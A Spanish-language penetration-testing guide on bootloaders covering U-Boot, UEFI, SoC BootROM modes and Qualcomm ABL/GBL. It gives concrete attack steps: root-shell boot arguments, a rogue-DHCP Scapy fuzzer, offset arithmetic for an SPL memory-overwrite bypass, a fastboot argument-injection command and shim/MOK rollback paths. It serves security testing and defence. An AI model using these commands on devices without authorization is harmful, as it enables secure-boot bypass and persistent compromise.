# Pruebas del bootloader

{{#include ../../banners/hacktricks-training.md}}

Se recomiendan los siguientes pasos para modificar las configuraciones de inicio del dispositivo y probar bootloaders como U-Boot y los cargadores de clase UEFI. Concéntrate en obtener ejecución temprana de código, evaluar las protecciones de firma y rollback, y abusar de las rutas de recuperación o de arranque por red.

Relacionado: bypass de secure boot de MediaTek mediante patching de bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Soluciones rápidas con U-Boot y abuso del entorno

1. Acceder al shell del intérprete
   - Durante el arranque, pulsa una tecla de interrupción conocida (a menudo cualquier tecla, 0, espacio o una secuencia específica de la placa) antes de que se ejecute `bootcmd` para acceder al prompt de U-Boot.<sup>[[1]](#references)</sup>

2. Inspeccionar el estado de arranque y las variables
   - Comandos útiles:
     - `printenv` (volcar el entorno)
     - `bdinfo` (información de la placa, direcciones de memoria)
     - `help bootm; help booti; help bootz` (métodos de arranque del kernel compatibles)
     - `help ext4load; help fatload; help tftpboot` (cargadores disponibles)

3. Modificar los argumentos de arranque para obtener un shell de root
   - Añade `init=/bin/sh` para que el kernel abra un shell en lugar de ejecutar el init normal:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot desde tu servidor TFTP
   - Configura la red y descarga una imagen kernel/fit desde la LAN:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Persistir cambios mediante el entorno
   - Si el almacenamiento de env no está protegido contra escritura, puedes persistir el control:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Comprueba si hay variables como `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` que influyan en las rutas de fallback. Los valores mal configurados pueden permitir acceder repetidamente al shell.

6. Comprobar las funciones de depuración/inseguras
   - Busca: `bootdelay` > 0, `autoboot` deshabilitado, `usb start; fatload usb 0:1 ...` sin restricciones, la posibilidad de usar `loady`/`loads` mediante serie, `env import` desde medios no confiables y kernels/ramdisks cargados sin comprobaciones de firma.

7. Pruebas de imágenes/verificación de U-Boot
   - Si la plataforma afirma usar arranque seguro/verificado con imágenes FIT, prueba tanto imágenes sin firmar como manipuladas:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - La ausencia de `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` o el comportamiento heredado de `verify=n` suele permitir arrancar payloads arbitrarios.
   - No te limites a un simple resultado de permitir/denegar: investigaciones recientes sobre FIT demostraron que la propia ruta de verificación puede ser una superficie de ataque pre-auth. Prueba con casos negativos los datos FIT almacenados externamente (`data-offset`, `data-position`, `data-size`), la selección de configuraciones firmadas, `loadables` y el manejo de overlays / `extra-conf`.
   - Si tienes un árbol de código fuente coincidente, `test/vboot/vboot_test.sh` permite reproducir rápidamente el comportamiento de verificación de FIT en U-Boot sandbox antes de probar con hardware real.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` y flujos de arranque mediante scripts
   - En las compilaciones modernas de U-Boot, `bootcmd` suele ser solo un envoltorio de Standard Boot. Esto significa que los medios de almacenamiento con permisos de escritura, PXE o la memoria flash SPI pueden convertirse en el verdadero límite de confianza, incluso cuando el entorno visible parece inofensivo.
   - El método de arranque `extlinux` busca `extlinux/extlinux.conf` en `/` y `/boot`; el método de arranque de scripts busca primero `boot.scr.uimg` y luego `boot.scr`. En el arranque por red, el nombre del script puede provenir de `boot_script_dhcp`.
   - Comandos útiles para el triaje:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Casos de abuso que se deben probar: medios USB/SD controlados por un atacante antes en `boot_targets`, `/boot/extlinux/extlinux.conf` con permisos de escritura, un servidor TFTP malicioso que proporcione `boot.scr` o ejecución de scripts respaldada por SPI mediante `script_offset_f`.
   - Si la plataforma depende de la verificación FIT, asegúrate de que las configuraciones estén firmadas en el nivel de configuración y no solo por imagen; `required-mode=all` es más estricto que aceptar cualquier clave requerida individual.

### Datos FIT externos de SPL copiados antes de la verificación

Al cargar FIT en SPL, una firma de configuración intacta no garantiza que los metadatos de la carga útil externa sean seguros. U-Boot excluye `data-position`, `data-offset` y `data-size` de las propiedades de configuración firmadas. En rutas afectadas de `load_simple_fit()`, SPL obtiene un desplazamiento de origen y una longitud de copia a partir de esos campos, y luego llama a `info->read()` **antes** de verificar el hash de la imagen. Por lo tanto, un FIT manipulado en un medio de arranque con permisos de escritura puede sobrescribir RAM sin falsificar una firma. La propiedad `load` firmada normalmente fija el destino, así que primero determina si una copia demasiado grande puede alcanzar la pila u otros datos de control desde esa dirección.<sup>[[15]](#references)[[16]](#references)</sup>

Sigue el cargador real de la placa y el mapa de memoria en lugar de suponer que se lee desde flash: el cargador RAM demostrado llegó a `spl_ram_load_read()` y `memcpy()`. En el punto de llamada, registra `fit_offset` y cualquier dirección base FIT que añada el lector, la longitud de bloque del cargador (`spl_get_bl_len(info)`), cualquier alineación específica de la bifurcación, el `read_offset` y el `size` resultantes, el destino `src_ptr` y la ubicación de la dirección de retorno guardada. Comprueba si una región de origen mapeada y contigua cubre la distancia de copia necesaria, si se superpone con el destino y si los bytes en la posición de origen pueden proporcionar un puntero a datos FIT controlados por el atacante. La [técnica genérica de sobrescritura parcial de la dirección de retorno](../../binary-exploitation/stack-overflow/ret2win/) se aplica si un puntero completo no satisface las restricciones de alineación del cargador.<sup>[[16]](#references)</sup>

En la compilación de prueba de 32 bits para AST2600 de los investigadores, `src_ptr` era `0x80001000` y la dirección de retorno guardada de `memcpy` estaba en `0x902ffe24`. Usaron una compilación upstream modificada con los helpers de ubicación de pila y alineación de OpenBMC: el lector RAM añadía una base FIT de `0x10000`, y esos helpers redondeaban hacia abajo el desplazamiento de origen a `ARCH_DMA_MINALIGN` (64 bytes). Un puntero little-endian útil en `0x902fffe4` y una copia que terminaba un byte antes cambiaban solo los tres bytes inferiores de la dirección de retorno guardada, conservando su byte superior cero, que ya se conocía. En cambio, el cargador RAM upstream usa una longitud de bloque de un byte, por lo que esta alineación de 64 bytes y la solución alternativa de sobrescritura parcial no son requisitos generales de SPL. Vuelve a calcular las direcciones, la longitud de bloque del cargador y el alcance de la copia para cada compilación. En el cálculo original de abajo, `fit_offset` indica la suma efectiva de la base FIT realizada por el lector RAM, que no es necesariamente el argumento pasado a `load_simple_fit()`.<sup>[[16]](#references)</sup>

```text
distance      = saved_return_slot - destination = 0x102fee24
data-position = pointer_slot - distance - fit_offset = 0x7fff11c0
data-size     = distance + 3 = 0x102fee27
```

La corrección upstream limita tanto el `data-size` sin procesar como el tamaño de transferencia **alineado a bloques** antes de `info->read()`. La ruta overlay pasa la capacidad real del búfer, mientras que otros llamadores usan `CONFIG_SYS_BOOTM_LEN`, que es solo un límite máximo aproximado, no una prueba de que el destino tenga tanta memoria libre. Al evaluar un fork de un proveedor, verifica que estas comprobaciones estén presentes y compara el rango de copia permitido con la pila SPL real de la placa y las regiones reservadas.<sup>[[15]](#references)[[16]](#references)</sup>

## Superficie de arranque de red (DHCP/PXE) y servidores rogue

9. Fuzzing de parámetros PXE/DHCP
   - El manejo heredado de BOOTP/DHCP de U-Boot ha tenido problemas de seguridad de memoria. Por ejemplo, CVE‑2024‑42040 describe una divulgación de memoria mediante respuestas DHCP manipuladas que pueden filtrar bytes de la memoria de U-Boot a través de la red.<sup>[[4]](#references)</sup> Prueba las rutas de código DHCP/PXE con valores demasiado largos o casos límite (`option 67 bootfile-name`, opciones del proveedor, campos `file`/`servername`) y observa si se producen bloqueos o leaks.
   - Fragmento mínimo de Scapy para poner a prueba los parámetros de arranque durante el netboot:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Valida también si los campos de nombre de archivo de PXE se pasan a la lógica de shell/loader sin sanitización cuando se encadenan con scripts de aprovisionamiento del lado del sistema operativo.

10. Pruebas de command injection en un servidor DHCP rogue
   - Configura un servicio DHCP/PXE rogue e intenta inyectar caracteres en los campos de nombre de archivo o de opciones para llegar a los intérpretes de comandos en etapas posteriores de la cadena de arranque. El auxiliar DHCP de Metasploit, `dnsmasq` o scripts personalizados de Scapy funcionan bien. Aísla primero la red de laboratorio.

## Modos de recuperación de ROM del SoC que anulan el arranque normal

Muchos SoC exponen un modo «loader» de BootROM que acepta código por USB/UART incluso cuando las imágenes flash no son válidas. Si no se han activado los fusibles de secure-boot, esto puede permitir la ejecución arbitraria de código en una etapa muy temprana de la cadena.

- NXP i.MX (Serial Download Mode)
  - Herramientas: `uuu` (mfgtools3) o `imx-usb-loader`.
  - Ejemplo: `imx-usb-loader u-boot.imx` para cargar y ejecutar un U-Boot personalizado desde RAM.
- Allwinner (FEL)
  - Herramienta: `sunxi-fel`.
  - Ejemplo: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` o `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Herramienta: `rkdeveloptool`.
  - Ejemplo: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` para preparar un loader y cargar un U-Boot personalizado.

Determina si se han quemado los eFuses/OTP de secure-boot del dispositivo. Si no, los modos de descarga de BootROM suelen eludir cualquier verificación de nivel superior (U-Boot, kernel, rootfs) al ejecutar directamente tu payload de primera etapa desde SRAM/DRAM.

## Bootloaders UEFI/de clase PC: comprobaciones rápidas

11. Pruebas de manipulación del ESP, rollback e inscripción de claves
   - Monta la partición del sistema EFI (ESP) y comprueba si hay componentes del loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, rutas de logotipos del proveedor.
   - Vuelca el estado de Secure Boot y las bases de datos de claves desde el sistema operativo, cuando sea posible:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Si la plataforma está en Setup Mode, acepta el enrolamiento de claves sin autenticación o incluye una Platform Key de prueba/predeterminada (clase PKfail), un administrador local o un atacante con acceso físico puede enrolar su propia KEK/db y mantener Secure Boot aparentemente «habilitado» mientras inicia binarios EFI arbitrarios.<sup>[[3]](#references)</sup>
   - Intenta iniciar con componentes de arranque firmados vulnerables conocidos o versiones anteriores si las revocaciones de Secure Boot (dbx) no están actualizadas. Si la plataforma todavía confía en shims/bootmanagers antiguos, a menudo puedes cargar tu propio kernel o `grub.cfg` desde la ESP para obtener persistencia.
   - En Windows, los equipos con los parches aplicados aún pueden aceptar boot managers firmados vulnerables si el firmante `Microsoft Windows Production PCA 2011` sigue ausente de la `dbx` del firmware, como se observó con BlackX.<sup>[[13]](#references)[[14]](#references)</sup> Un bypass al estilo Baton Drop puede enrolar un MOK del atacante; después, un shim legítimo puede cargar en futuros inicios una carga útil EFI firmada con esa clave.<sup>[[12]](#references)[[13]](#references)</sup> Revocar más adelante el antiguo firmante de Windows no elimina el MOK enrolado, por lo que la ruta basada en shim puede persistir si ese shim sigue siendo de confianza.<sup>[[12]](#references)</sup>
   - Antes de probar esta ruta de rollback en una máquina UEFI autorizada, comprueba el **estado efectivo de revocaciones del firmware**, no solo el historial de actualizaciones de Windows.<sup>[[13]](#references)[[14]](#references)</sup> Microsoft proporciona esta comprobación de solo lectura en PowerShell con privilegios elevados para el firmante de 2011 en `dbx`:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` es solo una pista: confirma el componente de arranque firmado específico y otras revocaciones en un laboratorio recuperable.<sup>[[12]](#references)[[14]](#references)</sup> Una actualización pendiente del registro o un certificado de firma caducado no equivalen a una revocación `dbx` completada.<sup>[[13]](#references)[[14]](#references)</sup>

12. Pruebas de revocación de shim / SBAT / dbx obsoletos
   - Los shims antiguos firmados por Microsoft y las bifurcaciones de proveedores aún pueden servir como vía para un bootkit al estilo BYOVD si las revocaciones están obsoletas. En un laboratorio aislado, coloca un shim históricamente vulnerable en la ESP e intenta encadenar el arranque de tu propio `grubx64.efi` o kernel.<sup>[[11]](#references)</sup>
   - Evaluación rápida:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Si el shim sigue ejecutándose pese a estar en la lista de revocación, el firmware/OS tiene actualizaciones `dbx` obsoletas o confía en un loader bifurcado que nunca incorporó las protecciones SBAT upstream.

13. Errores de análisis del logo de arranque (clase LogoFAIL)
   - Varios firmwares de OEM/IBV eran vulnerables a fallos de análisis de imágenes en DXE al procesar logos de arranque. Si un atacante puede colocar una imagen manipulada en el ESP bajo una ruta específica del proveedor (p. ej., `\EFI\<vendor>\logo\*.bmp`) y reiniciar, podría ser posible ejecutar código durante el arranque temprano, incluso con Secure Boot habilitado. Comprueba si la plataforma acepta logos proporcionados por el usuario y si esas rutas tienen permisos de escritura desde el OS.<sup>[[2]](#references)</sup>


## Brechas de confianza de Android/Qualcomm ABL + GBL (Android 16)

En dispositivos con Android 16 que usan ABL de Qualcomm para cargar la **Generic Bootloader Library (GBL)**, valida si ABL **autentica** la aplicación UEFI que carga desde la partición `efisp`. Si ABL solo comprueba la **presencia** de una aplicación UEFI y no verifica las firmas, una primitiva de escritura en `efisp` permite **ejecutar código sin firma antes del OS** durante el arranque.<sup>[[6]](#references)[[7]](#references)</sup>

Comprobaciones prácticas y vías de abuso:

- **primitiva de escritura en efisp**: Necesitas una forma de escribir una aplicación UEFI personalizada en `efisp` (servicio root/privilegiado, fallo en una aplicación OEM, ruta de recovery/fastboot). Sin esto, la brecha de carga de GBL no es directamente explotable.<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (fallo de ABL): Algunas compilaciones aceptan tokens adicionales en `fastboot oem set-gpu-preemption` y los añaden a la línea de comandos del kernel. Esto puede utilizarse para forzar SELinux permisivo y habilitar la escritura en particiones protegidas:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Si el dispositivo está parcheado, el comando debería rechazar argumentos adicionales.<sup>[[5]](#references)[[6]](#references)</sup>
- **Desbloqueo del bootloader mediante flags persistentes**: Un payload de la etapa de arranque puede cambiar flags persistentes de desbloqueo (p. ej., `is_unlocked=1`, `is_unlocked_critical=1`) para emular `fastboot oem unlock` sin los controles del servidor/aprobación del OEM. Esto cambia de forma duradera la configuración tras el siguiente reinicio.<sup>[[6]](#references)</sup>

Notas defensivas y de triaje:

- Confirma si ABL verifica la firma del payload GBL/UEFI de `efisp`. Si no lo hace, considera `efisp` una superficie de persistencia de alto riesgo.
- Comprueba si los handlers OEM de fastboot de ABL están parcheados para **validar la cantidad de argumentos** y rechazar tokens adicionales.<sup>[[8]](#references)[[9]](#references)</sup>

## Precauciones con el hardware

Ten cuidado al interactuar con la flash SPI/NAND durante el arranque temprano (p. ej., al conectar pines a tierra para omitir lecturas) y consulta siempre la hoja de datos de la flash. Los cortocircuitos en el momento equivocado pueden dañar el dispositivo o el programador.

## Notas y consejos adicionales

- Prueba `env export -t ${loadaddr}` y `env import -t ${loadaddr}` para mover blobs del entorno entre la RAM y el almacenamiento; algunas plataformas permiten importar el entorno desde medios extraíbles sin autenticación.
- Para obtener persistencia en sistemas basados en Linux que arrancan mediante `extlinux.conf`, suele bastar con modificar la línea `APPEND` (para inyectar `init=/bin/sh` o `rd.break`) en la partición de arranque si no se aplican comprobaciones de firma.
- Si el objetivo usa actualizaciones de doble ranura / A/B, revisa las técnicas anti-rollback y de desincronización de ranuras en la [descripción general del análisis de firmware](README.md) para no pasar por alto brechas de confianza exclusivas del actualizador, externas al bootloader.
- Si el espacio de usuario proporciona `fw_printenv/fw_setenv`, valida que `/etc/fw_env.config` coincida con el almacenamiento real del entorno. Los desplazamientos mal configurados permiten leer/escribir la región MTD incorrecta.

## References

- [1] [Metodología de pruebas de seguridad de firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Descubriendo LogoFAIL: los peligros del análisis de imágenes durante el arranque del sistema](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: las claves de plataforma no confiables socavan Secure Boot en el ecosistema UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Detalles de CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: desbloqueo de Xiaomi mediante dos cadenas sin sanear](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [El exploit GBL de Qualcomm Snapdragon 8 Elite permite a los atacantes desbloquear bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Arquitectura de Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: corregir la propagación de entradas no confiables a la línea de comandos del kernel](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: añadir una comprobación para el comando set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [No apto para arrancar: cómo romper la verificación de firmas FIT de U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Nota sobre vulnerabilidad VU#616257: los bootloaders shim de UEFI firmados por Microsoft son vulnerables a la omisión de Secure Boot](https://kb.cert.org/vuls/id/616257)
- [12] [Bootkit UEFI BlackLotus: mito confirmado](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: un bootkit UEFI similar a BlackLotus](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Cómo administrar las revocaciones de Windows Boot Manager para los cambios de Secure Boot](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
- [15] [Parche de U-Boot: limitar el tamaño de los datos externos antes de leerlos](https://github.com/u-boot/u-boot/commit/8f71d7170f5c3abadee45683e35ae6d925b6d417)
- [16] [Beneficios ocultos: omisión de la verificación de firmas en U-Boot SPL](https://www.binarly.io/blog/signature-verification-bypass-in-u-boot-spl)
{{#include ../../banners/hacktricks-training.md}}
